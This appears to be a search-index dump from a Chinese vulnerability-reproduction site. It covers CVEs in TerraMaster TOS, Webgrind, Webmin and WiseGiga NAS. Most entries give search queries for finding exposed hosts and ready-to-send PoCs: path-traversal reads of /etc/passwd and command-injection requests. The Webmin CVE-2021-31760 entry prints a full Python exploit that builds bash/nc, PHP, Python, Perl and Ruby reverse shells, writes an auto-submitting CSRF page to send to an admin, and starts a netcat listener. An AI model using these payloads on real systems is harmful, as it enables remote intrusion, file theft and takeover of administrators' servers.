","date":"0001-01-01","objectID":"/terramaster-tos-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-28187/:2:0","tags":null,"title":"","uri":"/terramaster-tos-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-28187/"},{"categories":null,"content":"网络测绘 \"TerraMaster\" \u0026\u0026 header=\"TOS\" ","date":"0001-01-01","objectID":"/terramaster-tos-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-28187/:3:0","tags":null,"title":"","uri":"/terramaster-tos-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-28187/"},{"categories":null,"content":"漏洞复现 登陆后访问，验证漏洞的POC为 /tos/index.php?editor/fileGet\u0026filename=../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/terramaster-tos-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-28187/:4:0","tags":null,"title":"","uri":"/terramaster-tos-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-28187/"},{"categories":null,"content":"TerraMaster TOS 用户枚举漏洞 CVE-2020-28185 ","date":"0001-01-01","objectID":"/terramaster-tos-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2020-28185/:0:0","tags":null,"title":"","uri":"/terramaster-tos-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2020-28185/"},{"categories":null,"content":"漏洞描述 TerraMaster TOS 存在用户枚举漏洞，通过wizard/initialise.php页面的username参数即可枚举系统中的用户，以及泄露邮箱信息 ","date":"0001-01-01","objectID":"/terramaster-tos-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2020-28185/:1:0","tags":null,"title":"","uri":"/terramaster-tos-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2020-28185/"},{"categories":null,"content":"漏洞影响 TerraMaster TOS \u003c 4.2.06 ","date":"0001-01-01","objectID":"/terramaster-tos-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2020-28185/:2:0","tags":null,"title":"","uri":"/terramaster-tos-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2020-28185/"},{"categories":null,"content":"网络测绘 \"TerraMaster\" \u0026\u0026 header=\"TOS\" ","date":"0001-01-01","objectID":"/terramaster-tos-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2020-28185/:3:0","tags":null,"title":"","uri":"/terramaster-tos-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2020-28185/"},{"categories":null,"content":"漏洞复现 漏洞点来源于找回密码的用户存在校验 输入用户名 admin 点击确定，查看Burp捕获的包 其中有一个请求包用于确认用户admin是否存在 存在则返回用户的邮箱信息 ","date":"0001-01-01","objectID":"/terramaster-tos-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2020-28185/:4:0","tags":null,"title":"","uri":"/terramaster-tos-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2020-28185/"},{"categories":null,"content":"Webgrind fileviewer.phtml 任意文件读取漏洞 CVE-2018-12909 ","date":"0001-01-01","objectID":"/webgrind-fileviewer.phtml-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-12909/:0:0","tags":null,"title":"","uri":"/webgrind-fileviewer.phtml-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-12909/"},{"categories":null,"content":"漏洞描述 Webgrind是一套PHP执行时间分析工具。其中Webgrind 1.5版本中存在安全漏洞，该漏洞源于程序依靠用户输入来显示文件。攻击者可以通过漏洞读取服务器敏感文件 ","date":"0001-01-01","objectID":"/webgrind-fileviewer.phtml-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-12909/:1:0","tags":null,"title":"","uri":"/webgrind-fileviewer.phtml-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-12909/"},{"categories":null,"content":"漏洞影响 Webgrind \u003c= 1.5 ","date":"0001-01-01","objectID":"/webgrind-fileviewer.phtml-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-12909/:2:0","tags":null,"title":"","uri":"/webgrind-fileviewer.phtml-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-12909/"},{"categories":null,"content":"网络测绘 app=\"Webgrind\" ","date":"0001-01-01","objectID":"/webgrind-fileviewer.phtml-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-12909/:3:0","tags":null,"title":"","uri":"/webgrind-fileviewer.phtml-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-12909/"},{"categories":null,"content":"漏洞复现 主页面 方法调用在 index.php 中 当参数为 fileviewer 时，将参数传递包含在文件 templates/fileviewer.phtml 中 参数 file 传入 fileviewer.phtml 通过函数 highlight_file 显示在页面中， 验证POC /index.php?op=fileviewer\u0026file=/etc/passwd ","date":"0001-01-01","objectID":"/webgrind-fileviewer.phtml-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-12909/:4:0","tags":null,"title":"","uri":"/webgrind-fileviewer.phtml-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-12909/"},{"categories":null,"content":"Webmin password_change.cgi 远程命令执行漏洞 CVE-2019-15107 ","date":"0001-01-01","objectID":"/webmin-password_change.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15107/:0:0","tags":null,"title":"","uri":"/webmin-password_change.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15107/"},{"categories":null,"content":"漏洞描述 Webmin是一个用于管理类Unix系统的管理配置工具，具有Web页面。在其找回密码页。面中，存在一处无需权限的命令注入漏洞，通过这个漏洞攻击者即可以执行任意系统命令。 ","date":"0001-01-01","objectID":"/webmin-password_change.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15107/:1:0","tags":null,"title":"","uri":"/webmin-password_change.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15107/"},{"categories":null,"content":"漏洞影响 Webmin \u003c= 1.920 ","date":"0001-01-01","objectID":"/webmin-password_change.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15107/:2:0","tags":null,"title":"","uri":"/webmin-password_change.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15107/"},{"categories":null,"content":"网络测绘 app=\"webmin\" ","date":"0001-01-01","objectID":"/webmin-password_change.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15107/:3:0","tags":null,"title":"","uri":"/webmin-password_change.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15107/"},{"categories":null,"content":"漏洞复现 登录页面 漏洞的触发点为文件 password_change.cgi 其中接受的POST传参的几个参数为 user pam expired old new1 new2， 值得注意的参数为 old, 对应的代码片段存在漏洞 if ($wuser) { # Update Webmin user's password $enc = \u0026acl::encrypt_password($in{'old'}, $wuser-\u003e{'pass'}); $enc eq $wuser-\u003e{'pass'} || \u0026pass_error($text{'password_eold'},qx/$in{'old'}/); $perr = \u0026acl::check_password_restrictions($in{'user'}, $in{'new1'}); $perr \u0026\u0026 \u0026pass_error(\u0026text('password_enewpass', $perr)); $wuser-\u003e{'pass'} = \u0026acl::encrypt_password($in{'new1'}); $wuser-\u003e{'temppass'} = 0; \u0026acl::modify_user($wuser-\u003e{'name'}, $wuser); \u0026reload_miniserv(); } 在 perl 中 qx/id/, 对应执行系统命令 id, 而可控的参数里 old 参数是可控的，导致命令执行 并通过 pass_error 回显至页面中， 验证POC POST /password_change.cgi user=rootxx\u0026pam=\u0026expired=2\u0026old=test|id\u0026new1=test2\u0026new2=test2 ","date":"0001-01-01","objectID":"/webmin-password_change.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15107/:4:0","tags":null,"title":"","uri":"/webmin-password_change.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15107/"},{"categories":null,"content":"Webmin rpc.cgi 后台远程命令执行漏洞 CVE-2019-15642 ","date":"0001-01-01","objectID":"/webmin-rpc.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15642/:0:0","tags":null,"title":"","uri":"/webmin-rpc.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15642/"},{"categories":null,"content":"漏洞描述 Webmin是一套基于Web的用于类Unix操作系统中的系统管理工具。 Webmin 1.920及之前版本中的rpc.cgi文件存在安全漏洞。攻击者可借助特制的对象名称利用该漏洞执行代码。 ","date":"0001-01-01","objectID":"/webmin-rpc.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15642/:1:0","tags":null,"title":"","uri":"/webmin-rpc.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15642/"},{"categories":null,"content":"漏洞影响 Webmin \u003c 1.920 ","date":"0001-01-01","objectID":"/webmin-rpc.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15642/:2:0","tags":null,"title":"","uri":"/webmin-rpc.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15642/"},{"categories":null,"content":"网络测绘 app=\"webmin\" ","date":"0001-01-01","objectID":"/webmin-rpc.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15642/:3:0","tags":null,"title":"","uri":"/webmin-rpc.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15642/"},{"categories":null,"content":"漏洞复现 登录页面 登录后发送请求包 POST /rpc.cgi Referer: https://xxx.xxx.xxx.xxx/sysinfo.cgi?xnavigation=1 OBJECT Socket;print \"Content-Type: text/plain\\n\\n\";$cmd=`id`;print \"$cmd\\n\\n\"; ","date":"0001-01-01","objectID":"/webmin-rpc.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15642/:4:0","tags":null,"title":"","uri":"/webmin-rpc.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-15642/"},{"categories":null,"content":"Webmin update.cgi 后台远程命令执行漏洞 CVE-2022-0824 ","date":"0001-01-01","objectID":"/webmin-update.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-0824/:0:0","tags":null,"title":"","uri":"/webmin-update.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-0824/"},{"categories":null,"content":"漏洞描述 Webmin是Webmin社区的一套基于Web的用于类Unix操作系统中的系统管理工具。 Webmin 1.990之前版本存在安全漏洞，该漏洞源于软件中存在不正确的访问控制，攻击者可以利用该漏洞实现远程代码执行 ","date":"0001-01-01","objectID":"/webmin-update.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-0824/:1:0","tags":null,"title":"","uri":"/webmin-update.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-0824/"},{"categories":null,"content":"漏洞影响 Webmin \u003c 1.990 ","date":"0001-01-01","objectID":"/webmin-update.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-0824/:2:0","tags":null,"title":"","uri":"/webmin-update.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-0824/"},{"categories":null,"content":"网络测绘 app=\"webmin\" ","date":"0001-01-01","objectID":"/webmin-update.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-0824/:3:0","tags":null,"title":"","uri":"/webmin-update.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-0824/"},{"categories":null,"content":"漏洞复现 登录页面 登录后发送请求包 POST /package-updates/update.cgi HTTP/1.1 Cookie: sid=882af4543067bc6214d2c769325f3b2f Referer: http:///package-updates/update.cgi?xnavigation=1 mode=new\u0026search=ssh\u0026redir=\u0026redirdesc=\u0026u=0;id;\u0026confirm=Install+Now ","date":"0001-01-01","objectID":"/webmin-update.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-0824/:4:0","tags":null,"title":"","uri":"/webmin-update.cgi-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-0824/"},{"categories":null,"content":"Webmin 多个高危漏洞 CVE-2021-31760~62 ","date":"0001-01-01","objectID":"/webmin-%E5%A4%9A%E4%B8%AA%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E-cve-2021-31760~62/:0:0","tags":null,"title":"","uri":"/webmin-%E5%A4%9A%E4%B8%AA%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E-cve-2021-31760~62/"},{"categories":null,"content":"漏洞描述 CVE-2021-31760:利用CSRF攻击，实现对Webmin的远程命令执行。 CVE-2021-31761:利用XSS攻击，实现对Webmin的远程命令执行。 CVE-2021-31762:利用CSRF攻击，通过Webmin的添加用户功能创建特权用户，然后通过特权用户权限反弹shell。 参考链接： CVE-2021-31760：https://github.com/electronicbots/CVE-2021-31760 CVE-2021-31761：https://github.com/electronicbots/CVE-2021-31761 CVE-2021-31762：https://github.com/electronicbots/CVE-2021-31762 ","date":"0001-01-01","objectID":"/webmin-%E5%A4%9A%E4%B8%AA%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E-cve-2021-31760~62/:1:0","tags":null,"title":"","uri":"/webmin-%E5%A4%9A%E4%B8%AA%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E-cve-2021-31760~62/"},{"categories":null,"content":"漏洞影响 Webmin \u003c= 1.973 ","date":"0001-01-01","objectID":"/webmin-%E5%A4%9A%E4%B8%AA%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E-cve-2021-31760~62/:2:0","tags":null,"title":"","uri":"/webmin-%E5%A4%9A%E4%B8%AA%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E-cve-2021-31760~62/"},{"categories":null,"content":"网络测绘 app=\"Webmin\" ","date":"0001-01-01","objectID":"/webmin-%E5%A4%9A%E4%B8%AA%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E-cve-2021-31760~62/:3:0","tags":null,"title":"","uri":"/webmin-%E5%A4%9A%E4%B8%AA%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E-cve-2021-31760~62/"},{"categories":null,"content":"漏洞复现 CVE-2021-31760 poc： import time, subprocess,random print('''\\033[1;37m __ __ _ ____ _ _________ _ _ _ | \\/ | | | |___ \\| | |___ / _ \\| | | | | | | \\ / | ___ ___| |__ __) | | / / | | | | __| |_ _ ___| | __ | |\\/| |/ _ \\/ __| '_ \\ |__ \u003c| | / /| | | | |/ _` | | | |/ __| |/ / | | | | __/\\__ \\ | | |___) | | _ _ / /_| |_| | | (_| | |_| | (__| \u003c |_| |_|\\___||___/_| |_|____/|_| (_|_) /_____\\___/|_|\\__,_|\\__, |\\___|_|\\_/ __/ | |___/ \\033[1;m''') for i in range(101): print( \"\\r\\033[1;36m [\u003e] POC By \\033[1;m \\033[1;37mMesh3l\\033[1;m \\033[1;36m ( \\033[1;m\\033[1;37m@Mesh3l_911\\033[1;m\\033[1;36m ) \u0026 \\033[1;m \\033[1;37mZ0ldyck\\033[1;m\\033[1;36m ( \\033[1;m\\033[1;37m@electronicbots\\033[1;m\\033[1;36m ) \\033[1;m {} \\033[1;m\".format( i), \"\\033[1;36m%\\033[1;m\", end=\"\") time.sleep(0.02) print(\"\\n\\n\") target = input( \"\\033[1;36m \\n Please input ur target's webmin path e.g. ( https://webmin.Mesh3l-Mohammed.com/ ) \u003e \\033[1;m\") if target.endswith('/'): target = target + 'proc/run.cgi' else: target = target + '/proc/run.cgi' ip = input(\"\\033[1;36m \\n Please input ur IP to set up the Reverse Shell e.g. ( 10.10.10.10 ) \u003e \\033[1;m\") port = input(\"\\033[1;36m \\n Please input a Port to set up the Reverse Shell e.g. ( 1337 ) \u003e \\033[1;m\") ReverseShell = input \\ ('''\\033[1;37m \\n 1- Bash Reverse Shell \\n 2- PHP Reverse Shell \\n 3- Python Reverse Shell \\n 4- Perl Reverse Shell \\n 5- Ruby Reverse Shell \\n \\033[1;m \\033[1;36mPlease insert the number Reverse Shell's type u want e.g. ( 1 ) \u003e \\033[1;m''') file_name = random.randrange(1000) if ReverseShell == '1': ReverseShell = 'mkfifo /tmp/'+str(file_name)+'; nc '+ip+' '+port+' 0\u003c/tmp/'+str(file_name)+' | /bin/sh \u003e/tmp/'+str(file_name)+' 2\u003e\u00261; rm /tmp/'+str(file_name)+'' elif ReverseShell == '2': ReverseShell = ''' php -r '$sock=fsockopen(\"''' + ip + '''\",''' + port + ''');exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' ''' elif ReverseShell == '3': ReverseShell = ''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"''' + ip + '''\",''' + port + '''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' ''' elif ReverseShell == '4': ReverseShell = ''' perl -e 'use Socket;$i=\"''' + ip + '''\";$p=''' + port + ''';socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003e\u0026S\");open(STDOUT,\"\u003e\u0026S\");open(STDERR,\"\u003e\u0026S\");exec(\"/bin/sh -i\");};' ''' elif ReverseShell == '5': ReverseShell = ''' ruby -rsocket -e'f=TCPSocket.open(\"''' + ip + '''\",''' + port + ''').to_i;exec sprintf(\"/bin/sh -i \u003c\u0026%d \u003e\u0026%d 2\u003e\u0026%d\",f,f,f)' ''' else: print(\"\\033[1;36m \\n Please Re-Check ur input :( \\033[1;m \\n\") def CSRF_Generator(): with open('CSRF_POC.html', 'w') as POC: POC.write \\ (''' \u003chtml\u003e \u003chead\u003e \u003cmeta name=\"referrer\" content=\"never\"\u003e \u003c/head\u003e \u003cbody\u003e \u003cscript\u003ehistory.pushState('', '', '/')\u003c/script\u003e \u003cform action=\"''' + target +'''\" method=\"POST\"\u003e \u003cinput type=\"hidden\" name=\"cmd\" value=\"''' + ReverseShell + '''\" /\u003e \u003cinput type=\"hidden\" name=\"mode\" value=\"0\" /\u003e \u003cinput type=\"hidden\" name=\"user\" value=\"root\" /\u003e \u003cinput type=\"hidden\" name=\"input\" value=\"\" /\u003e \u003cinput type=\"hidden\" name=\"undefined\" value=\"\" /\u003e \u003cinput type=\"submit\" value=\"Submit request\" /\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit(); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ''') POC.close() print( \"\\033[1;36m\\nThe CSRF_POC has been generated successfully , send it to a Webmin's Admin and wait for your Reverse Shell ^_^ \\n \\033[1;m\") def Netcat_listener(): print() subprocess.run([\"nc\", \"-nlvp \"+port+\"\"]) def main(): CSRF_Generator() Netcat_listener() if __name__ == '__main__': main() CVE-2021-31761 poc： import time, subprocess,random,urllib.parse print('''\\033[1;37m __ __ _ ____ _ _________ _ _ _ | \\/ | | | |___ \\| | |___ / _ \\| | | | | | | \\ / | ___ ___| |__ __) | | / / | | | | __| |_ _ ___| | __ | |\\/| |/ _ \\/ __| '_ \\ |__ \u003c| | / /| | | | |/ _` | | | |/ __| |/ / | | | | __/\\__ \\ | | |___) | | _ _ / /_| |_| | | (_| | |_| | (__| \u003c |_| |_|\\___||___/_| |_|____/|_| (_|","date":"0001-01-01","objectID":"/webmin-%E5%A4%9A%E4%B8%AA%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E-cve-2021-31760~62/:4:0","tags":null,"title":"","uri":"/webmin-%E5%A4%9A%E4%B8%AA%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E-cve-2021-31760~62/"},{"categories":null,"content":"WiseGiga NAS down_data.php 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/wisegiga-nas-down_data.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/wisegiga-nas-down_data.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 WiseGiga 是一家销售网络连接存储（NAS ）产品的韩国公司。 WISEGIGA NAS down_data.php 存在任意文件下载漏洞，由于 /down_data.php 页面 filename 参数过滤不严，导致可以读取系统敏感文件。 ","date":"0001-01-01","objectID":"/wisegiga-nas-down_data.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/wisegiga-nas-down_data.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 WiseGiga NAS ","date":"0001-01-01","objectID":"/wisegiga-nas-down_data.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/wisegiga-nas-down_data.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"WISEGIGA-NAS\" ","date":"0001-01-01","objectID":"/wisegiga-nas-down_data.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/wisegiga-nas-down_data.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页面 验证POC /down_data.php?filename=../../../../../../../../../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/wisegiga-nas-down_data.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/wisegiga-nas-down_data.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"WiseGiga NAS group.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/wisegiga-nas-group.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/wisegiga-nas-group.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 WiseGiga 是一家销售网络连接存储（NAS ）产品的韩国公司。 WiseGiga NAS group.php文件存在远程命令执行漏洞，攻击者通过发送特定的请求包可以获取服务器权限 ","date":"0001-01-01","objectID":"/wisegiga-nas-group.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/wisegiga-nas-group.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 WiseGiga NAS ","date":"0001-01-01","objectID":"/wisegiga-nas-group.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/wisegiga-nas-group.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"WISEGIGA-NAS\" ","date":"0001-01-01","objectID":"/wisegiga-nas-group.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/wisegiga-nas-group.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页面 验证POC /admin/group.php?memberid=root\u0026cmd=add\u0026group_name=d;id\u003e1.txt /admin/1.txt 